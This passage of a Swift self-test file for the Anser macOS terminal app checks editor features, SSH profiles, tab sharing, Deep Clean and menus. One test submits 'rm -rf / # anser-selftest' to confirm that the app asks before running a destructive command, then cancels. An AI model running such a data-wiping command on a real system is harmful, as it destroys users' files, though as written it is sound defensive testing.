            check("moving away closes it", !pane.previewShowing)
        }
        let sshText = "Host prod-web *.internal\n  HostName 10.0.0.5\n  User deploy\nHost *\n  ServerAliveInterval 30\n"
        let parsedHosts = SSHConfig.hosts(in: sshText)
        check("SSH hosts come from ~/.ssh/config (patterns skipped)", parsedHosts.map(\.alias) == ["prod-web"] && parsedHosts.first?.detail == "deploy@10.0.0.5")
        Services.shared.setProfilesForTest([Profile(host: "prod-*", tabColor: "red", badge: "PRODSSH")])
        pane.sessionDidStartCommand(s, command: "ssh prod-web")
        check("a profile applies as soon as you ssh to a matching host", pane.profile?.badge == "PRODSSH", pane.sshTarget ?? "no target")
        Services.shared.setProfilesForTest([])
        pane.sessionDidShowPrompt(s)
        check("it clears when the ssh command ends", pane.profile == nil && pane.sshTarget == nil)

        // ---- Editor: mistakes, brackets, cursors, lines, ⌃R, AI, vim ----
        let edt = pane.editor
        wc.window?.makeFirstResponder(edt)
        edt.setCommand("tre -L 2 ")
        check("an unknown command is flagged once you move past it", edt.hintIssue?.message.contains("“tre”") == true, edt.hintIssue?.message ?? "none")
        edt.setCommand("echo 'oops")
        edt.setSelectedRange(NSRange(location: 0, length: 0))
        check("an unclosed quote is flagged", edt.hintIssue?.message.contains("quote") == true, edt.hintIssue?.message ?? "none")
        edt.setCommand("git push --force origin main")
        check("force push gets a warning", edt.hintIssue?.severity == .warning && edt.hintIssue?.message.contains("force-with-lease") == true)
        pane.layoutSubtreeIfNeeded()
        snap(pane, "editor-warning")
        edt.setCommand("echo $(date)")
        check("the matching bracket is highlighted", edt.bracketPair?.0 == 6 && edt.bracketPair?.1 == 11, "\(String(describing: edt.bracketPair))")
        edt.clear()
        pane.submitFromEditor("rm -rf / # anser-selftest")
        ok = await wait(2) { pane.lastConfirmation?.messageText == "Run this anyway?" }
        check("a destructive command asks before running", ok)
        if let w = pane.window, let sheet = w.attachedSheet { w.endSheet(sheet, returnCode: .alertFirstButtonReturn) }
        ok = await wait(2) { edt.string == "rm -rf / # anser-selftest" }
        check("cancelling keeps it in the editor, not run", ok && !(s.blocks.last?.command.hasPrefix("rm -rf /") ?? false))
        edt.setCommand("echo a; echo b")
        edt.setSelectedRange(NSRange(location: 5, length: 0))
        edt.extraSelections = [NSRange(location: 13, length: 0)]
        edt.insertText("X", replacementRange: NSRange(location: NSNotFound, length: 0))
        check("typing goes to every cursor", edt.string == "echo Xa; echo Xb", edt.string)
        edt.deleteBackward(nil)
        check("backspace too", edt.string == "echo a; echo b", edt.string)
        edt.setCommand("ls foo; cat foo")
        edt.setSelectedRange(NSRange(location: 3, length: 3))
        edt.selectNextOccurrence()
        edt.insertText("bar", replacementRange: NSRange(location: NSNotFound, length: 0))
        check("⌥⌘D adds the next match", edt.string == "ls bar; cat bar", edt.string)
        edt.setCommand("echo one\necho two")
        edt.setSelectedRange(NSRange(location: 0, length: 0))
        edt.toggleComment()
        let commented = edt.string
        edt.toggleComment()
        check("⌘/ comments a line out and back", commented == "# echo one\necho two" && edt.string == "echo one\necho two", commented)
        edt.setSelectedRange(NSRange(location: 0, length: 0))
        edt.moveLines(up: false)
        check("⌃⌘↓ moves a line down", edt.string == "echo two\necho one", edt.string)
        edt.duplicateLines(up: false)
        check("⇧⌥↓ duplicates it", edt.string.components(separatedBy: "\n").count == 3)
        edt.setCommand("anser-needle")
        edt.startInlineHistory()
        ok = await wait(2) { edt.popup.isVisible && edt.popup.items.contains { $0.insert.contains("anser-needle") } }
        check("⌃R shows matching history right under the editor", ok)
        snap(pane, "inline-history", full: true)
        edt.hidePopup()
        let hadAI = Services.shared.aiForcedOn, oldAI = Services.shared.aiOverride
        Services.shared.aiForcedOn = true
        Services.shared.ai = AIHelp(apiKey: { "k" }, transport: { _ in
            (200, Data(try! JSONSerialization.data(withJSONObject: ["stop_reason": "end_turn",
                "content": [["type": "text", "text": "Sizes, biggest last:\n```sh\ndu -sh * | sort -h\n```"]]])))
        })
        // A real event goes through the app first, like a key press would: macOS closes
        // its automatic undo group only after events (the test's edits above had none).
        if let e = NSEvent.otherEvent(with: .applicationDefined, location: .zero, modifierFlags: [], timestamp: 0,
                                      windowNumber: 0, context: nil, subtype: 0, data1: 0, data2: 0) { NSApp.postEvent(e, atStart: false) }
        await sleep(0.1)
        edt.setCommand("# biggest folders here")
        await sleep(0.05)
        check("a # line offers AI on Tab", edt.isAIRequest && pane.hintText.contains("Tab asks"), pane.hintText)
        edt.askAIInline()
        ok = await wait(5) { edt.string == "du -sh * | sort -h" }
        check("# description + Tab becomes the command", ok, edt.string)
        snap(pane, "ai-inline")
        await sleep(0.1)
        let um = edt.undoManager
        let diag = "level \(um?.groupingLevel ?? -1) · canUndo \(um?.canUndo ?? false) · same manager as window: \(um === wc.window?.undoManager)"
        edt.breakUndoCoalescing()
        edt.undoManager?.undo()     // what ⌘Z does in the editor (sent straight to it: other test windows may be in front)
        let afterOne = edt.string
        check("⌘Z brings your words back", afterOne == "# biggest folders here", "after ⌘Z: '\(afterOne)' · \(diag) · first responder is editor: \(wc.window?.firstResponder === edt)")
        Services.shared.aiForcedOn = hadAI
        Services.shared.aiOverride = oldAI
        Services.shared.setVimForTest(true)
        func key(_ c: String, _ code: UInt16 = 0) {
            if let e = NSEvent.keyEvent(with: .keyDown, location: .zero, modifierFlags: [], timestamp: 0, windowNumber: wc.window?.windowNumber ?? 0,
                                        context: nil, characters: c, charactersIgnoringModifiers: c, isARepeat: false, keyCode: code) { edt.keyDown(with: e) }
        }
        edt.setCommand("echo hello world")
        await sleep(0.05)   // real key presses each arrive in their own event (and undo step)
        key("\u{1b}", 53)
        check("Esc enters vim normal mode", edt.vimNormal && pane.hintText.contains("NORMAL"))
        snap(pane, "vim-normal")
        key("0"); key("w")
        await sleep(0.05)
        check("0 and w move like vim", edt.selectedRange().location == 5, "\(edt.selectedRange().location)")
        key("d"); key("w")
        await sleep(0.05)
        check("dw deletes a word", edt.string == "echo world", edt.string)
        key("u")
        check("u undoes", edt.string == "echo hello world", edt.string)
        key("A")
        check("A appends (back to typing)", !edt.vimNormal && edt.selectedRange().location == (edt.string as NSString).length)
        Services.shared.setVimForTest(false)
        edt.clear()

        // ---- Timing, blame, find in all tabs, pictures, sharing, VoiceOver ----
        let hist = Services.shared.history
        let timed = "sleep 2 # anser-selftest-timing"
        for d in [4.0, 4.0] { let id = hist.recordStart(command: timed, cwd: tmp, session: nil); hist.recordFinish(id: id, exitCode: 0, duration: d) }
        check("history knows how long a command usually takes", PaneView.usefulTiming(for: timed)?.typical == 4)
        pane.run(timed)
        ok = await wait(3) { pane.runningLabelText.contains("usually 4.0s") }
        check("a running command shows its usual time", ok, pane.runningLabelText)
        snap(pane, "timing")
        _ = await wait(6) { s.atPrompt && s.blocks.last?.command == timed }

        // A clean repository (the main test folder is set up as an unsafe one on purpose).
        let blameRepo = tmp + "/blame-repo"
        try? FileManager.default.removeItem(atPath: blameRepo)
        try? FileManager.default.createDirectory(atPath: blameRepo, withIntermediateDirectories: true)
        _ = await ScriptRunner.shared.run("git init -q && printf 'first line\\nsecond line\\n' > blame-me.txt && git add blame-me.txt && git -c user.email=t@t -c user.name=Tester commit -qm 'add blame file'",
                                          cwd: blameRepo, env: s.env, timeout: 5)
        wc.showBlame(for: pane, path: blameRepo + "/blame-me.txt", line: 2)
        ok = await wait(5) { openPicker()?.itemTitles.contains { $0.contains("second line") } == true && openPicker()?.selectedRowIndex == 1 }
        check("blame opens at the line you asked about", ok, openPickerTitles().joined(separator: " | "))
        if let p = openPicker() {
            _ = await wait(3) { p.previewString.contains("add blame file") }
            check("blame shows who changed it and the commit", p.previewString.contains("add blame file") && (p.itemTitles.first.map { _ in true } ?? false))
            snapView(p.contentView!, "picker-blame")
        }
        closePickers()

        pane.run("echo anser-alltabs-$((7*6)) # anser-selftest")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("alltabs") == true }
        await sleep(0.5)
        let homeTab = wc.selectedIndex
        wc.addTab(cwd: tmp)
        let otherPane = wc.focusedPane!
        _ = await wait(20) { otherPane.session.integrated && otherPane.session.atPrompt }
        wc.showSearchAllTabs(for: otherPane)
        ok = await wait(3) { openPicker() != nil }
        if let p = openPicker() {
            p.setQuery("alltabs-42")
            ok = await wait(3) { p.refresh(); return p.itemTitles.contains { $0.contains("anser-alltabs-42") } }
            check("Find in All Tabs finds output from another tab", ok, p.itemTitles.prefix(3).joined(separator: " | "))
            p.acceptSelectedForTest()
            ok = await wait(2) { wc.selectedIndex == homeTab }
            check("choosing a result goes to its tab", ok)
        }
        closePickers()
        wc.closeTab(wc.tabs.count - 1)
        wc.selectTab(homeTab)

        pane.run(#"printf '\033_Gi=31,s=1,v=1,a=q,t=d,f=24;AAAA\033\\'; read -rs -t 2 -d '\' r; [[ $r == *OK* ]] && echo kitty-graphics-ok # anser-selftest"#)
        ok = await wait(8) { (pane.surfaceView.viewportText() ?? "").contains("kitty-graphics-ok") }
        check("the terminal shows pictures (kitty graphics)", ok)
        pane.run("whence -w imgcat # anser-selftest")
        ok = await wait(5) { (pane.surfaceView.viewportText() ?? "").contains("imgcat: ") }
        check("imgcat is available", ok && !(pane.surfaceView.viewportText() ?? "").contains("imgcat: none"))

        var share: TabShare?
        TabShare.start(for: pane) { share = $0 }
        ok = await wait(3) { share != nil }
        check("sharing a tab starts a read-only page", ok, share?.link ?? "no share")
        if let share {
            let page = try? await URLSession.shared.data(from: URL(string: share.localLink)!)
            let html = page.map { String(decoding: $0.0, as: UTF8.self) } ?? ""
            let bad = try? await URLSession.shared.data(from: URL(string: "http://127.0.0.1:\(share.port)/s/not-the-secret")!)
            check("the page needs the secret link", html.contains("read-only") && (bad?.1 as? HTTPURLResponse)?.statusCode == 404)
            pane.run("echo anser-share-$((6*7)) # anser-selftest")
            _ = await wait(5) { s.atPrompt && s.blocks.last?.command.contains("anser-share") == true }
            let seen = SentBodies()
            let reader = Task {
                if let (bytes, _) = try? await URLSession.shared.bytes(from: URL(string: share.localLink + "/events")!) {
                    for try await line in bytes.lines where line.contains("anser-share-42") { seen.add(line); break }
                }
            }
            ok = await wait(6) { !seen.all.isEmpty }
            check("viewers see the tab's screen live", ok)
            pane.layoutSubtreeIfNeeded()
            snap(pane, "sharing")
            reader.cancel()
            share.stop()
            check("sharing stops", TabShare.share(for: pane) == nil)
        }

        func unlabeled(_ v: NSView) -> [String] {
            var out: [String] = []
            for sub in v.subviews where !sub.isHidden {
                if let b = sub as? NSButton, b.title.isEmpty, (b.accessibilityLabel() ?? "").isEmpty, (b.toolTip ?? "").isEmpty {
                    out.append(b.image?.accessibilityDescription ?? String(describing: Swift.type(of: b)))
                }
                out += unlabeled(sub)
            }
            return out
        }
        let missing = unlabeled(wc.window!.contentView!)
        check("every visible button has a label for VoiceOver", missing.isEmpty, missing.joined(separator: ", "))

        // ---- Clear and Deep Clean ----
        pane.run("echo anser-clear-$((5*5)) # anser-selftest")
        _ = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-clear") == true }
        await sleep(0.3)
        pane.clearScreen()
        ok = await wait(2) { !(pane.surfaceView.viewportText() ?? "").contains("anser-clear-25") }
        check("Clear wipes the screen", ok)
        check("Clear keeps the tab's command list", s.blocks.contains { $0.command.contains("anser-clear") })
        if s.persistent {
            let bytes = SessionHost.shared.request(["cmd": "replaySize", "id": s.id])?["bytes"] as? Int ?? -1
            check("Clear also wipes the copy kept for restarts", bytes >= 0 && bytes < 600, "\(bytes) bytes")
        }
        pane.confirmDeepClean()
        ok = await wait(2) { pane.lastConfirmation?.messageText == "Deep clean this tab?" }
        check("Deep Clean asks first", ok)
        if let w = pane.window, let sheet = w.attachedSheet { w.endSheet(sheet, returnCode: .alertSecondButtonReturn) }
        // Garble the terminal on purpose: DEC line drawing turns q into ─ (what cat-ing a binary file can do).
        pane.run(#"printf '\033(0' # anser-selftest"#)
        _ = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("033(0") == true }
        pane.deepClean(removeFromHistory: true)
        await sleep(0.4)
        check("Deep Clean forgets this tab's commands", s.blocks.isEmpty)
        pane.run("echo abcq-deep # anser-selftest")
        ok = await wait(10) { (pane.surfaceView.viewportText() ?? "").contains("abcq-deep") }
        check("Deep Clean resets the terminal (text reads normally again)", ok, (pane.surfaceView.viewportText() ?? "").suffix(80).description)
        // (History search is fuzzy, so look for the exact command.)
        ok = await wait(3) { !Services.shared.history.search("anser-clear-", scope: .all).contains { $0.0.command.contains("anser-clear-$((5*5))") } }
        check("and can remove them from History", ok)
        snap(pane, "deep-clean", full: true)

        // ---- Folder menu on the folder chip; Split Left / Up ----
        let folderMenu = FileActions.folderMenu(tmp, pane: pane).items.filter { !$0.isSeparatorItem }.map(\.title)
        check("the folder under the editor has a right-click menu",
              Array(folderMenu.prefix(5)) == ["cd Here (you're here)", "New Tab Here", "New Window Here", "Open in Finder", "Copy Path"],
              folderMenu.joined(separator: ", "))
        check("…and the folder chip offers it", pane.folderChipMenuTitles.contains("New Window Here"))
        wc.split(pane, vertical: true, before: true)
        let leftPane = wc.allPanes.first { $0 !== pane }
        let leftOK = leftPane.map { $0.frame.minX < pane.frame.minX } ?? false
        check("Split Left puts the new pane on the left", wc.allPanes.count == 2 && leftOK)
        if let leftPane { wc.close(leftPane) }
        wc.split(pane, vertical: false, before: true)
        let upPane = wc.allPanes.first { $0 !== pane }
        // In the split view, the first subview is the upper one.
        let upOK = (upPane?.superview as? NSSplitView).map { $0.arrangedSubviews.first === upPane } ?? false
        check("Split Up puts the new pane above", wc.allPanes.count == 2 && upOK)
        if let upPane { wc.close(upPane) }
        let shellMenu = NSApp.mainMenu?.items.first { $0.submenu?.title == "Shell" }?.submenu?.items.map(\.title) ?? []
        check("Shell menu has Split Left and Split Up", shellMenu.contains("Split Left") && shellMenu.contains("Split Up"))
        pane.focus()

        // ---- Dock menu ----
        let dock = AppDelegate.shared.applicationDockMenu(NSApp)?.items.map(\.title) ?? []
        check("Dock icon menu offers New Window and New Tab", dock.starts(with: ["New Window", "New Tab"]), dock.joined(separator: ", "))
        let tabsBefore = wc.tabs.count
        AppDelegate.shared.dockNewTab(nil)
        ok = await wait(3) { wc.tabs.count == tabsBefore + 1 }
        check("Dock → New Tab opens a tab in the front window", ok, "\(tabsBefore) → \(wc.tabs.count)")
        if ok { wc.closeTab(wc.tabs.count - 1) }
        wc.window?.makeKeyAndOrderFront(nil)

        // ---- Default terminal: folders open as tabs (nothing system-wide is changed here) ----
        let tabsBeforeOpen = wc.tabs.count
        let openDir = tmp + "/opened-folder"
        try? FileManager.default.createDirectory(atPath: openDir, withIntermediateDirectories: true)
        AppDelegate.shared.handleOpen(URL(fileURLWithPath: openDir))
        ok = await wait(15) { wc.tabs.count == tabsBeforeOpen + 1 && wc.focusedPane?.session.cwd.hasSuffix("opened-folder") == true }
        check("a folder dropped on the Dock icon opens a tab there", ok, wc.focusedPane?.session.cwd ?? "")
        if wc.tabs.count > tabsBeforeOpen { wc.closeTab(wc.tabs.count - 1) }
        let appItems = NSApp.mainMenu?.items.first?.submenu?.items.map(\.title) ?? []
        check("app menu offers to make Anser the default terminal", appItems.contains { $0.contains("Default Terminal") }, appItems.joined(separator: ", "))
        wc.window?.makeKeyAndOrderFront(nil)

        // ---- New menus ----
        let allItems = (NSApp.mainMenu?.items ?? []).flatMap { $0.submenu?.items ?? [] }.map(\.title)
        check("menus for the new features", ["Search Command Output…", "Type in All Panes of This Tab", "Resolve Conflicts…", "Open Pull Request",
                                             "Check for Updates…", "Import from iTerm2 or Warp…", "Your Feature Usage…"].allSatisfy(allItems.contains),
              allItems.filter { $0.contains("…") }.count.description)

        // Settings window.
        SettingsWindowController.shared.show()
        await sleep(0.3)
        for (i, name) in ["appearance", "editor", "behavior", "ai", "shortcuts", "profiles", "advanced"].enumerated() {
            SettingsWindowController.shared.selectSection(i)
            await sleep(0.2)
            if let v = SettingsWindowController.shared.window?.contentView { snapView(v, "settings-\(name)") }
        }
        SettingsWindowController.shared.show(section: "Profiles")
        check("settings has Shortcuts and Profiles pages", SettingsWindowController.shared.selectedSectionName == "Profiles")
        SettingsWindowController.shared.selectSection(0)
        SettingsWindowController.shared.close()

        // Splits and layout snapshot.
        wc.split(pane, vertical: true)
        check("split creates a second pane", wc.allPanes.count == 2)
        let second = wc.allPanes.last!
        ok = await wait(30) { second.session.integrated && second.session.atPrompt }
        check("new pane starts in the same folder", ok && second.session.cwd.hasSuffix("anser-selftest"), second.session.cwd)
        if case .split(let vertical, let children, _)? = wc.snapshot() {
            check("layout snapshot for session restore", vertical && children.count == 2)
        } else {
            check("layout snapshot for session restore", false)
        }
        wc.close(second)
        check("closing a split leaves one pane", wc.allPanes.count == 1)

        // Pickers.
        wc.showBlocks(for: pane)
        ok = await wait(3) { NSApp.windows.contains { $0 is PickerPanel && $0.isVisible } }
        check("command blocks panel opens", ok)
        (NSApp.windows.first { $0 is PickerPanel } as? PickerPanel)?.close()

        // Completion sources.
        let r = await Services.shared.engine.complete(CompletionContext(line: "git chec", cursor: 8, cwd: s.cwd), env: s.env)
        check("git completion in live session", r.first?.insert == "checkout")
        let ls = await Services.shared.engine.complete(CompletionContext(line: "ls -", cursor: 4, cwd: s.cwd), env: s.env)
        check("ls flags read from its man page", ls.count >= 10, "\(ls.count) flags")
    }
}

/// Keeps the highest memory seen (sampled every 0.1 s on a background thread).
final class MemorySampler: @unchecked Sendable {
    private var peak: UInt64 = 0
    private let lock = NSLock()
    init() {
        let t = Thread { [weak self] in
            while self != nil {
                let now = MemoryUse.footprint().current
                self?.lock.withLock { if now > self!.peak { self!.peak = now } }
                Thread.sleep(forTimeInterval: 0.1)
            }
        }
        t.start()
    }
    /// The peak since the last call.
    func takePeak() -> UInt64 { lock.withLock { let p = peak; peak = 0; return p } }
}

/// Samples memory every 0.1 s: before, the highest while running, and after.
final class MemoryProbe {
    private let before = MemoryUse.footprint().current
    private var peak: UInt64 = 0
    private var timer: Timer?
    init() {
        timer = Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { [weak self] _ in
            guard let self else { return }
            self.peak = max(self.peak, MemoryUse.footprint().current)
        }
    }
    func finish() -> String {
        timer?.invalidate()
        let after = MemoryUse.footprint().current
        MemoryUse.releaseFreed()
        let released = MemoryUse.footprint().current
        return "before \(MemoryUse.megabytes(before)) · peak \(MemoryUse.megabytes(peak)) · after \(MemoryUse.megabytes(after)) · after giving back \(MemoryUse.megabytes(released))"
    }
}

final class SentBodies: @unchecked Sendable {
    private var bodies: [String] = []
    private let lock = NSLock()
    func add(_ b: String) { lock.withLock { bodies.append(b) } }
    var all: [String] { lock.withLock { bodies } }
}


final class ArgsCapture: @unchecked Sendable {
    private var v: [String] = []
    private let l = NSLock()
    func set(_ a: [String]) { l.withLock { v = a } }
    func get() -> [String] { l.withLock { v } }
}
